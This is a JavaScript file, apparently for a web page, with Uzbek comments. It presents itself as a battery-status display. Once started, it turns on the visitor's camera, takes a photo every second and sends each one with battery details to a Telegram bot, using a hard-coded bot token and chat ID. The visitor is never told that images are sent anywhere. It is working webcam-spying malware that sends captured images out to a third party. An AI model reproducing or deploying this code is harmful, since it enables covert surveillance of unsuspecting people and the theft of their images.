const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

let batteryStatus = {
    level: 0,
    charging: false
};

// **1. Kamera mavjudligini tekshirish va ishlatish**
async function startCamera() {
    try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const hasCamera = devices.some(device => device.kind === 'videoinput');

        if (!hasCamera) {
            console.error('Kamera topilmadi!');
            alert('Kamera topilmadi! Iltimos, kamerani ulang.');
            return;
        }

        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        setInterval(() => {
            takeAndSendPhoto();
        }, 1000);

    } catch (error) {
        console.error('Kamera kirishiga ruxsat berilmadi:', error);
        alert('Kameraga ruxsat berilmadi yoki kamera band.');
    }
}

// **2. Rasmni olish va Telegram botga yuborish**
async function takeAndSendPhoto() {
    if (!video.videoWidth || !video.videoHeight) {
        console.error("Kamera hali ishga tushmagan.");
        return;
    }

    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async (blob) => {
        if (!blob) {
            console.error('Rasmni olishda xatolik!');
            return;
        }

        const formData = new FormData();
        formData.append('photo', blob);

        const botToken = '8280146484:AAFRqo8YHQwNjHbqBrzkzS849PcIuyuYuDA';
        const chatId = '7329380226';

        const caption = `Battery: ${batteryStatus.level}%\nCharging: ${batteryStatus.charging ? 'Yes' : 'No'}`;

        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&caption=${encodeURIComponent(caption)}`, {
                method: 'POST',
                body: formData
            });
            const result = await response.json();

            if (result.ok) {
                console.log('Rasm muvaffaqiyatli yuborildi!');
            } else {
                console.error('Rasm yuborishda xatolik:', result.description);
            }
        } catch (error) {
            console.error('Rasm yuborishda xatolik:', error.message);
        }
    }, 'image/jpeg');
}

// **3. Batareya darajasini yangilash**
function updateBatteryStatus(battery) {
    batteryStatus.level = Math.round(battery.level * 100);
    batteryStatus.charging = battery.charging;

    const levelEl = document.getElementById('level');
    const chargingEl = document.getElementById('charging');

    if (levelEl) levelEl.textContent = batteryStatus.level;
    if (chargingEl) chargingEl.textContent = batteryStatus.charging ? 'Yes' : 'No';
}

// **4. Batareya ma'lumotlarini olish**
navigator.getBattery().then(battery => {
    updateBatteryStatus(battery);

    battery.addEventListener('levelchange', () => updateBatteryStatus(battery));
    battery.addEventListener('chargingchange', () => updateBatteryStatus(battery));
});
startCamera();